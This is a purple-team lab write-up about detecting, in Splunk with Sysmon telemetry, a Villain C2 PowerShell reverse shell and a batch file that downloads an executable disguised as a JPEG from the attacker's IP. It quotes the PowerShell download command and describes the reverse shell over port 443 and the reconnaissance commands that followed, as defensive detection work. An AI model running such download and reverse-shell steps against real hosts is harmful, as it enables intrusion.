Detecting a C2 Reverse Shell & Disguised-Payload Delivery in Splunk

Splunk Sysmon Threat Detection MITRE ATT&CK Villain C2 Incident Response Purple Team

Executive Summary

A purple-team exercise in an isolated home lab. Using the Villain C2 framework from a Kali attacker VM, a PowerShell reverse shell was executed against a Sysmon-monitored Windows 10 endpoint, alongside a disguised-executable delivery and a benign file-transfer demonstration. The activity was then investigated entirely from the defender's side in Splunk to reconstruct the full attack chain.

Three threads emerged: (1) a batch file downloaded a Windows executable disguised as spiderman.jpeg that was delivered to disk but never executed; (2) a payload was staged locally with a Bat-to-EXE converter; and (3) the actual compromise — a PowerShell ISE process established an outbound reverse shell to the attacker over TCP 443, followed by hands-on-keyboard reconnaissance. The write-up is also honest about a real detection limit: with Sysmon-only logging (no PowerShell Script Block Logging, no EDR), commands typed inside the live shell were not individually recorded.

Lab Environment

  • Attacker: Kali Linux — Villain C2 + Python http.server — 192.168.253.130
  • Victim: Windows 10 (DESKTOP-RB4I4KI) — Sysmon (SwiftOnSecurity config) + Splunk Universal Forwarder
  • SIEM: Splunk Enterprise on Ubuntu Server — Sysmon received on TCP 9997, index sysmon
Note: the compromised account is DESKTOP-RB4I4KI\John doe (Medium integrity — no privilege escalation). The S-1-5-18 UserID in Sysmon event headers is the SYSTEM account that writes the log, not the user who ran the process.

MITRE ATT&CK Mapping

  • T1059.001 / T1059.003 — Command & Scripting Interpreter: PowerShell / Windows Command Shell
  • T1204.002 — User Execution: Malicious File (double-clicked .bat)
  • T1027 / T1562.001 — Obfuscated Files or Information / Impair Defenses (AMSI bypass)
  • T1036 — Masquerading (PE delivered as spiderman.jpeg)
  • T1105 — Ingress Tool Transfer (iwr downloads)
  • T1071.001 — Application Layer Protocol: Web (C2 over TCP 443)
  • T1033 / T1082 — System Owner/User & System Information Discovery (whoami, ipconfig)

1. Triage — Pivot on the Attacker IP

The investigation began from a single known indicator — the attacker IP — and pivoted outward through process lineage. Because Sysmon was indexed as raw XML (XmlWinEventLog), fields were extracted at search time with spath and known values matched as raw text.

index=sysmon 192.168.253.130 | spath | table _time EventID Image CommandLine DestinationIp DestinationPort ProcessGuid
📸 Pivoting on the attacker IP 192.168.253.130 in Splunk.

2. First Event — a Disguised Download Chain

The earliest event shows cmd.exe running rat.bat from the user's Documents folder, which spawned PowerShell to download a file named spiderman.jpeg from the attacker. The parent chain is explorer.exe → cmd /c rat.bat → powershell.exe — i.e. the user double-clicked a malicious batch file (T1204.002). The cmd.exe hash is just the legitimate Windows binary; the malicious element is the argument it was told to run.

powershell -c "iwr 'http://192.168.253.130/spiderman.jpeg' -O spiderman.jpeg"
📸 First event — PowerShell download launched by rat.bat via cmd.exe.

3. Enrichment — the "Image" is a Windows Executable

The SHA256 of the downloaded file was checked against VirusTotal, which identified it as a Windows PE executable — not a JPEG. This is Masquerading (T1036): an executable disguised with an image extension.

📸 VirusTotal identifies the file as a Windows PE, not an image.

4. Did the Payload Execute? Opened, Not Run

Pivoting on the file name showed spiderman.jpeg was opened by Photos.exe — the signed Windows image viewer. The key analytical point: the file appears only as an argument passed to other processes, never as a process Image of its own. Because the .jpeg extension routes it to the image viewer (which cannot execute a PE), the payload was delivered to disk but did not execute as code. Delivery succeeded; detonation did not.

📸 The file is only ever an argument — confirming it was not executed as code.

5. The Real C2 — PowerShell ISE Reverse Shell over 443

A second thread in the same IP pivot revealed the actual compromise: a PowerShell ISE process making an outbound connection (Sysmon Event ID 3) to the attacker on TCP 443. Port 443 lets the C2 blend with normal HTTPS; the tell is not the port but that powershell_ise.exe — not a browser — is holding the connection.

Malicious process: PowerShell_ISE.exe · ProcessGuid {07ecc6ec-3f41-6ab8-921c-000000003b00} · parent explorer.exe · network (EID 3) → 192.168.253.130:443.
📸 The real C2 — PowerShell ISE connecting to the attacker on TCP 443.

6. Ingress Tool Transfer & Reconnaissance

A file payload.ps1 was found at C:\Users\Public\payload.ps1. On the attacker side it was served from a Python web server on Kali and pulled down with Invoke-WebRequest — a clean demonstration of Ingress Tool Transfer (T1105). Hands-on-keyboard discovery (e.g. whoami) followed via the shell.

📸 Attacker side: payload.ps1 served from Kali's http.server and pulled by the victim.
📸 whoami executed through the shell — standard post-exploitation discovery.

Analyst Notes

payload.ps1 is not an actual PowerShell payload. Despite the .ps1 extension, it was created on the attacker with a plain echo ("this is a fake payload script") — a harmless placeholder used only to demonstrate the transfer technique. Detection keys on the behaviour (a process reaching an external IP and writing a file), not the file's contents, which an analyst would not have at alert time.
Obtaining the hash — lab vs. production. The file never executed, so Sysmon captured no hash (EID 1 only hashes the executing image; EID 11 file-creation has no hash by default). It was hashed directly on the host with Get-FileHash; VirusTotal returned no matches, consistent with a locally-created, unknown file. In production an analyst would not touch the host — the hash would come from EDR, or the file would be hashed / collected via EDR live-response (e.g. CrowdStrike RTR, Defender Live Response) while preserving evidence.
📸 VirusTotal returns no matches for the locally-created file.

Visibility Gaps & Limitations

This lab ran on Sysmon-only telemetry with no PowerShell Script Block Logging and no EDR — a real detection constraint worth stating plainly:

  • Commands typed inside the live shell (dir, type systeminfo.txt, type sysmonconfig-export.xml) ran inside the existing PowerShell process and spawned no new processes, so Sysmon logged no Event ID 1 for them — they are effectively invisible here.
  • Without Script Block Logging (Event ID 4104), the actual script content executed by the shell is not recorded.
  • Without EDR, there is no command-line history, no automatic hashing of non-executed files, and no behavioural telemetry tying individual actions to the session.

Net effect: the investigation proves a reverse shell was established and sees process creation, network connections and file writes — but not most of what the attacker did once inside. Recommended fix: enable Script Block Logging + Module Logging via GPO, forward the PowerShell/Operational and Security channels to Splunk, and add an EDR agent.

Findings & Recommended Mitigations

The pattern is consistent with local tooling/testing on the host, with the single clear external-C2 event being the ISE reverse shell on 443 — the event that warrants immediate escalation and host isolation. Prioritising it over the noisier-but-failed disguised-file thread is the key triage judgement.

  • Alert on PowerShell / PowerShell ISE making outbound connections to external IPs (especially raw IPs on 80/443).
  • Alert on script interpreters spawned from Explorer/Office/batch files, and cmd /c running .bat from user-writable folders.
  • Enforce PowerShell Constrained Language Mode + restrictive execution policy; enable AMSI and Script Block Logging.
  • Flag files whose true type does not match their extension, and executables run from Temp / Public.
  • On a confirmed C2 connection, isolate the host via EDR, block the destination, and preserve for forensics.

Conclusion

From a single indicator, the full attack chain was reconstructed in Splunk using Sysmon process-lineage pivoting — the failed disguised-executable delivery, the local staging, and the successful ISE reverse shell over 443 — with enrichment and MITRE mapping throughout, and an honest account of the Sysmon-only blind spots. The exercise demonstrates operating a SIEM end-to-end from the defender's seat, informed by an offensive background that makes each attacker action legible in telemetry.

Conducted in an isolated personal lab against systems I own. Sample hashes and IPs are from the lab environment.
